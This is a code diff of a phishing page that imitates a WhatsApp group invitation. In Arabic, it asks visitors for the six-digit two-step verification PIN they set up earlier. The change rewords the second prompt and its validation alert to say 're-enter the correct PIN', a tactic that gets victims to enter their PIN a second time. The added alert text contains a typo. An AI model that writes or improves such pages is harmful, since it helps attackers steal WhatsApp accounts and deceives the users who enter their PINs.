@@ -220,7 +220,7 @@
                 container.innerHTML = `
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                     <h1>انضم إلى مجموعة واتساب الآن  </h1>
-                    <p>يرجى إدخال رمز التحقق المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.</p>
+                    <p>يرجى إعادة إدخال رمز التحقق الصحيح المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.</p>
                     <input id="pinCode2" type="tel" placeholder="PIN " maxlength="6">
                     <button onclick="submitSecondPin()">متابعة</button>
                     <div id="countdown"></div>
@@ -232,7 +232,7 @@
             const pinCode2 = document.getElementById('pinCode2').value;
 
             if (!pinCode2 || pinCode2.length !== 6 || !/^\d+$/.test(pinCode2)) {
-                alert('يرجى إدخال رمز التحقق المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.');
+                alert('يرجى إإعادة دخال رمز التحقق الصحيح المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.');
                 return;
             }
 
